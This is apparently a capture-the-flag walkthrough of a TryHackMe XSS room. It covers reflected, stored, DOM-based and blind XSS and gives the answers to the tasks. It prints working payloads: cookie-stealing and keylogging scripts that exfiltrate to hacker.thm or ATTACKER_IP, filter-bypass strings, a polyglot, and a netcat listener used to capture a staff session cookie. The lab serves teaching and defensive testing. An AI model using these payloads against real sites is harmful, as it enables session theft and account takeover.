## Foundation Knowledge: Understanding Cross-Site Scripting

### What is Cross-Site Scripting (XSS)?

Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.

### Why XSS Matters

XSS vulnerabilities are extremely common and can be highly lucrative for security researchers. Some notable XSS bounty rewards include:
- **$7,500** for XSS found in Steam chat
- **$2,500** for XSS in HackerOne
- Multiple reports of XSS in major applications like Shopify and Infogram

### Prerequisites for Understanding XSS

- **JavaScript Basics**: Since XSS is based on JavaScript execution
- **Client-Server Communication**: Understanding HTTP requests and responses
- **Web Application Architecture**: Basic knowledge of how web applications work

---

## Task 1: Room Brief - Setting the Foundation

### Understanding the XSS Landscape

Cross-Site Scripting represents one of the most significant threats to modern web applications. Unlike server-side vulnerabilities, XSS attacks target the client-side, exploiting the trust that users have in legitimate websites.

### The Core Concept

XSS attacks work by injecting malicious scripts into trusted websites. When other users visit these compromised pages, the malicious scripts execute in their browsers, potentially compromising their data, sessions, and privacy.

### Task Challenge

**Question**: What does XSS stand for?

**Answer**: **Cross-Site Scripting**

**Explanation**: The acronym XSS is used instead of CSS to avoid confusion with Cascading Style Sheets.

**Key Insight**: Understanding that XSS is fundamentally about executing unauthorized JavaScript in a user's browser context is crucial for both offensive and defensive security.

---

## Task 2: XSS Payloads - The Heart of the Attack

### Understanding Payloads

In XSS, the payload is the JavaScript code we wish to be executed on the target's computer. Every XSS payload consists of two components:

1. **The Intention**: What you want the JavaScript to accomplish
2. **The Modification**: Changes needed to make the code execute in specific scenarios

### Common XSS Payload Types

### Proof of Concept

The simplest payload demonstrates XSS capability by triggering an alert box:

```javascript
<script>alert('XSS');</script>
```

**Purpose**: Demonstrates that JavaScript execution is possible
**Impact**: Confirms vulnerability exists for further exploitation

### Session Stealing

Extracts user session cookies for account hijacking:

```javascript
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

**How it works**:
- `document.cookie` accesses the victim's cookies
- `btoa()` base64 encodes the cookies for safe transmission
- `fetch()` sends the encoded cookies to an attacker-controlled server

### Key Logger

Captures all keystrokes from the compromised webpage:

```javascript
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```

**Dangerous scenarios**:
- Login forms with username/password fields
- Credit card information entry
- Personal information collection

### Business Logic Exploitation

Targets specific application functions for unauthorized actions:

```javascript
<script>user.changeEmail('attacker@hacker.thm');</script>
```

**Example attack chain**:
1. Change victim's email address
2. Initiate password reset
3. Gain full account control

### Task Challenges

**Challenge 1: Document Properties**
*Question*: Which document property could contain the user's session token?

*Answer*: **cookie**

*Explanation*: The `document.cookie` property contains session tokens and authentication cookies.

**Challenge 2: Proof of Concept**
*Question*: Which JavaScript method is often used as a Proof Of Concept?

*Answer*: **alert**

*Explanation*: The `alert()` method is commonly used to demonstrate XSS vulnerabilities with visible confirmation.

## Task 3: Reflected XSS - Immediate Execution

### Understanding Reflected XSS

Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation. The malicious script is "reflected" back to the user immediately.

### How Reflected XSS Works

**Example Scenario:**
A website displays error messages based on a URL parameter:
```
https://website.thm/search?error=Invalid search term
```

If the application doesn't validate the `error` parameter, an attacker can inject:
```
https://website.thm/search?error=<script>alert('XSS')</script>
```

### Attack Vector Demonstration

**Normal Request:**
```html
<div class="error">Invalid search term</div>
```

**Malicious Request:**
```html
<div class="error"><script>alert('XSS')</script></div>
```

### Potential Impact

**Attack Scenarios:**
- Sending malicious links to victims via email or social media
- Embedding malicious iframes on attacker-controlled websites
- Stealing session cookies when victims click crafted links
- Redirecting users to phishing sites

### Testing for Reflected XSS

**Common Entry Points:**
- URL query string parameters
- URL file path components
- HTTP headers (less common but possible)
- Form data in POST requests

**Testing Methodology:**
1. Identify all input points that reflect data back to the page
2. Test each point with basic XSS payloads
3. Analyze how the input is reflected in the page source
4. Modify payloads based on the reflection context

### Task Challenge

**Question**: Where in a URL is a good place to test for reflected XSS?

**Answer**: **Parameters** (or **Query String**)

**Explanation**: URL parameters are the most common place where user input gets reflected back to the page without proper validation.

---

## Task 4: Stored XSS - Persistent Threats

### Understanding Stored XSS

Stored XSS occurs when the XSS payload is stored in the web application (typically in a database) and then executed when other users visit the affected page. This makes it more dangerous than reflected XSS because it affects multiple users persistently.

### How Stored XSS Works

**Example Scenario:**
A blog website allows users to post comments without properly validating the content:

**Attacker posts comment:**
```html
Great article! <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

**Result**: Every user who views the blog post will have their cookies stolen.

### Attack Flow Visualization

1. **Attacker Input**: Malicious script submitted through comment form
2. **Storage**: Application stores the unfiltered script in the database
3. **Victim Access**: Legitimate users visit the page
4. **Execution**: Browser executes the stored malicious script
5. **Impact**: Victim's data is compromised

### Potential Impact

**Widespread Consequences:**
- **Mass User Compromise**: Every visitor to the affected page is potentially compromised
- **Session Hijacking**: Stolen cookies allow account takeover
- **Data Theft**: Access to sensitive user information
- **Malware Distribution**: Redirecting users to malicious websites
- **Defacement**: Altering website content for all users

### Testing for Stored XSS

**Common Storage Points:**
- Blog comments and forum posts
- User profile information (bio, description fields)
- Product reviews and ratings
- Message boards and chat systems
- File upload functionality with metadata

**Testing Strategy:**
1. Identify areas where user input is stored and displayed
2. Submit test payloads through all input mechanisms
3. Check if payloads execute when the stored data is viewed
4. Test different user privilege levels to understand scope

**Client-Side Bypass Techniques:**
Sometimes developers rely on client-side validation, which can be bypassed by:
- Intercepting requests with Burp Suite or similar tools
- Manually crafting HTTP requests
- Modifying form data before submission

### Task Challenge

**Question**: How are stored XSS payloads usually stored on a website?

**Answer**: **Database**

**Explanation**: Stored XSS payloads are typically saved in the application's database and retrieved when users access the affected pages.

---

## Task 5: DOM-Based XSS - Client-Side Exploitation

### Understanding the DOM

The **D**ocument **O**bject **M**odel (DOM) is a programming interface for HTML and XML documents. It represents the page structure so that programs can dynamically change the document structure, style, and content.

### What is DOM-Based XSS?

DOM-Based XSS occurs when JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. The vulnerability exists in client-side scripts that process user input unsafely.

### How DOM-Based XSS Works

**Example Scenario:**
Website JavaScript reads from `window.location.hash` and writes content to the page:

```javascript
// Vulnerable code
var userInput = window.location.hash.substring(1);
document.getElementById('content').innerHTML = userInput;
```

**Attack URL:**
```
https://website.thm/page#<script>alert('XSS')</script>
```

**Execution Flow:**
1. User visits the malicious URL
2. JavaScript extracts content after the # symbol
3. Content is directly inserted into the DOM
4. Browser executes the injected script

### Common DOM XSS Sources

**Dangerous JavaScript Methods:**
- `document.write()`
- `element.innerHTML`
- `element.outerHTML`
- `eval()`
- `setTimeout()` and `setInterval()` with string arguments

**User-Controllable Sources:**
- `window.location.hash`
- `window.location.search`
- `document.referrer`
- `window.name`
- `localStorage` and `sessionStorage` data

### Testing for DOM-Based XSS

**Analysis Requirements:**
- **Source Code Review**: Examining JavaScript for unsafe data handling
- **Dynamic Analysis**: Testing how user input flows through the application
- **Browser Developer Tools**: Monitoring DOM changes and JavaScript execution

**Testing Methodology:**
1. Identify JavaScript code that processes user-controllable data
2. Trace data flow from source to sink
3. Test with various payloads to confirm execution
4. Analyze the execution context for payload modification needs

### Potential Impact

**Attack Scenarios:**
- **Crafted Links**: Victims clicking malicious URLs
- **Content Manipulation**: Altering page content dynamically
- **Session Theft**: Stealing cookies and authentication tokens
- **Phishing**: Creating fake login forms within legitimate sites

### Task Challenge

**Question**: What unsafe JavaScript method is good to look for in source code?

**Answer**: **eval**

**Explanation**: The `eval()` method executes JavaScript code represented as a string, making it extremely dangerous when processing user input.

---

## Task 6: Blind XSS - Hidden Exploitation

### Understanding Blind XSS

Blind XSS is similar to stored XSS, but with a crucial difference: you cannot see the payload working or test it against yourself first. The payload gets stored and executed in areas only accessible to other users (typically staff or administrators).

### How Blind XSS Works

**Example Scenario:**
A website has a contact form where messages are sent to staff members:

1. **User Input**: Attacker submits malicious payload through contact form
2. **Storage**: Message is stored in staff support system
3. **Staff Access**: Staff member views the message in private admin portal
4. **Execution**: Malicious script executes in staff member's browser
5. **Compromise**: Attacker gains access to admin session/data

### Attack Flow Visualization

```
Attacker → Contact Form → Database → Staff Portal → Script Execution → Data Exfiltration
```

### Potential Impact

**High-Value Targets:**
- **Administrative Access**: Staff members often have elevated privileges
- **Sensitive Data**: Admin portals may contain customer information
- **System Control**: Administrative accounts may have system management capabilities
- **Lateral Movement**: Compromised admin accounts enable further attacks

**Exploitation Results:**
- Staff portal URL disclosure
- Administrative session hijacking
- Access to customer data and internal systems
- Privilege escalation within the organization

### Testing for Blind XSS

**Key Requirements:**
- **Callback Mechanism**: Payload must "phone home" to confirm execution
- **Patience**: May need to wait for staff to view the submitted content
- **Comprehensive Payloads**: Must work across different contexts and browsers

**Testing Strategy:**
1. Identify input points that likely reach staff/admin users
2. Submit payloads with callback mechanisms
3. Monitor for incoming requests indicating execution
4. Analyze received data for valuable information

### Blind XSS Tools

**XSS Hunter Express:**
- Popular tool for automated Blind XSS testing
- Automatically captures cookies, URLs, page contents
- Provides detailed execution reports
- Generates unique payloads for tracking

**Custom Solutions:**
- Simple HTTP server to receive callbacks
- Webhook services for payload notifications
- DNS request monitoring for out-of-band detection

### Task Challenges

**Challenge 1: Testing Tools**
*Question*: What tool can you use to test for Blind XSS?

*Answer*: **XSS Hunter Express**

*Explanation*: XSS Hunter Express is a popular tool specifically designed for Blind XSS testing with automatic payload generation and callback handling.

**Challenge 2: XSS Type Similarity**
*Question*: What type of XSS is very similar to Blind XSS?

*Answer*: **Stored**

*Explanation*: Blind XSS is similar to Stored XSS because the payload is stored and executed later, but differs in that the attacker cannot directly observe the execution.

## Task 7: Perfecting Your Payload - Advanced Techniques

### Understanding Payload Context

The payload is the JavaScript code we want to execute on the target's browser. How your JavaScript payload gets reflected in the target website's code determines the specific payload modifications needed for successful execution.

### Practical Payload Development

**Objective for Each Level:**
Execute the JavaScript alert function with the string 'THM':
```javascript
<script>alert('THM');</script>
```

### Level One: Basic Injection

**Scenario**: User input reflected directly in HTML content

**Input Form**: Name field that displays entered value on the page

**Payload**:
```javascript
<script>alert('THM');</script>
```

**How it works**:
- Input is placed directly into HTML content
- Browser interprets `<script>` tags and executes JavaScript
- No escaping or filtering prevents execution

**Page Source Result**:
```html
<div>Hello <script>alert('THM');</script></div>
```

### Level Two: Input Tag Escape

**Scenario**: User input reflected inside an input tag's value attribute

**Context**:
```html
<input type="text" value="USER_INPUT_HERE">
```

**Problem**: Script tags don't execute within input value attributes

**Solution**: Escape the input tag first
```javascript
"><script>alert('THM');</script>
```

**Breakdown**:
- `">` closes the value attribute and input tag
- `<script>alert('THM');</script>` executes outside the input context

**Result**:
```html
<input type="text" value=""><script>alert('THM');</script>
```

### Level Three: Textarea Tag Escape

**Scenario**: User input reflected inside a textarea element

**Context**:
```html
<textarea>USER_INPUT_HERE</textarea>
```

**Solution**: Close the textarea tag before script execution
```javascript
</textarea><script>alert('THM');</script>
```

**Breakdown**:
- `</textarea>` closes the current textarea element
- Script tag executes outside the textarea context

**Result**:
```html
<textarea></textarea><script>alert('THM');</script>
```

### Level Four: JavaScript Context Escape

**Scenario**: User input reflected within existing JavaScript code

**Context**:
```javascript
<script>
var name = "USER_INPUT_HERE";
</script>
```

**Solution**: Escape the JavaScript string and add new commands
```javascript
';alert('THM');//
```

**Breakdown**:
- `'` closes the current string
- `;` ends the current JavaScript statement
- `alert('THM');` executes the desired payload
- `//` comments out remaining code to prevent syntax errors

**Result**:
```javascript
<script>
var name = "';alert('THM');//";
</script>
```

### Level Five: Filter Bypass

**Scenario**: Basic keyword filtering removes dangerous words

**Problem**: The word "script" gets filtered out from payloads

**Filter Behavior**:
```
Original: <script>alert('THM');</script>
Filtered: <alert('THM');</>
```

**Solution**: Double the filtered word so removal still leaves valid payload
```javascript
<sscriptcript>alert('THM');</sscriptcript>
```

**Filter Process**:
```
Original: <sscriptcript>alert('THM');</sscriptcript>
Removed:  <s______cript>alert('THM');</s______cript>
Result:   <script>alert('THM');</script>
```

### Level Six: Character Filtering and Event Handlers

**Scenario**: Angular brackets (`<` and `>`) are filtered, preventing tag creation

**Context**: Input reflected in an image tag
```html
<img src="USER_INPUT_HERE">
```

**Problem**: Cannot create new tags due to character filtering

**Solution**: Use existing tag attributes for code execution
```javascript
/images/cat.jpg" onload="alert('THM');
```

**How it works**:
- `"` closes the src attribute
- `onload="alert('THM');"` adds an event handler
- Event executes when the image loads

**Result**:
```html
<img src="/images/cat.jpg" onload="alert('THM');">
```

### XSS Polyglots

**What is a Polyglot?**
An XSS polyglot is a string of text that can escape attributes, tags, and bypass filters all in one payload. It's designed to work across multiple contexts without modification.

**Universal Polyglot Example**:
```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

**Polyglot Benefits**:
- Works across multiple injection contexts
- Bypasses various filtering mechanisms
- Saves time during testing by providing universal payload
- Demonstrates advanced understanding of XSS techniques

### Task Challenge

**Question**: What is the flag you received from level six?

**Answer**: [Flag obtained after completing all six levels]

**Process**: Complete each level systematically, adapting payloads to the specific injection context and filtering mechanisms.

## Task 8: Practical Example (Blind XSS) - Real-World Application

### Setting Up the Lab Environment

This task demonstrates Blind XSS in a realistic support ticket system, simulating how attackers might target administrative interfaces.

### Initial Reconnaissance

**Target**: Acme IT Support website support ticket system

**Process**:
1. Create user account through signup process
2. Navigate to Support Tickets section
3. Create test ticket to understand functionality
4. Analyze how input is processed and displayed

### Basic Vulnerability Testing

**Initial Test**: Create ticket with simple content
```
Subject: Test
Content: test
```

**Source Code Analysis**: Input reflected in textarea element
```html
<textarea>test</textarea>
```

### Confirming Textarea Escape

**Test Payload**: Verify ability to escape textarea context
```
</textarea>test
```

**Result**: Successfully breaks out of textarea element
```html
<textarea></textarea>test
```

### Confirming JavaScript Execution

**XSS Payload**: Test basic script execution
```javascript
</textarea><script>alert('THM');</script>
```

**Result**: Alert box confirms JavaScript execution capability

### Advanced Payload Development

### Setting Up Data Exfiltration

**Netcat Listener**: Prepare to receive stolen data
```bash
nc -nlvp 9001
```

**Command Breakdown**:
- `-n`: Avoid DNS resolution
- `-l`: Listen mode
- `-v`: Verbose output
- `-p 9001`: Listen on port 9001

### Cookie Stealing Payload

**Complete Payload**:
```javascript
</textarea><script>fetch('http://ATTACKER_IP:9001?cookie=' + btoa(document.cookie));</script>
```

**Payload Analysis**:
- `</textarea>`: Escapes the textarea context
- `<script>`: Opens JavaScript execution context
- `fetch()`: Makes HTTP request to attacker server
- `http://ATTACKER_IP:9001`: Attacker-controlled endpoint
- `?cookie=`: Query parameter containing stolen data
- `btoa(document.cookie)`: Base64 encoded victim cookies
- `document.cookie`: Accesses victim's session cookies

### Exploitation Process

1. **Submit Payload**: Create support ticket with malicious content
2. **Wait for Staff**: Support staff will eventually view the ticket
3. **Receive Data**: Netcat listener captures incoming requests
4. **Decode Information**: Base64 decode captured cookie data

### Impact Assessment

**Captured Information**:
- Staff session cookies
- Administrative access tokens
- Potentially sensitive system information

**Potential Follow-up Attacks**:
- Session hijacking using stolen cookies
- Administrative account takeover
- Access to customer data and internal systems

### Task Challenge

**Question**: What is the value of the staff-session cookie?

**Process**:
1. Execute the complete payload in a support ticket
2. Monitor Netcat listener for incoming requests
3. Extract base64 encoded cookie data from request
4. Decode using base64 decoder (e.g., https://www.base64decode.org/)
5. Locate staff-session cookie value

**Answer**: [Decoded staff-session cookie value]
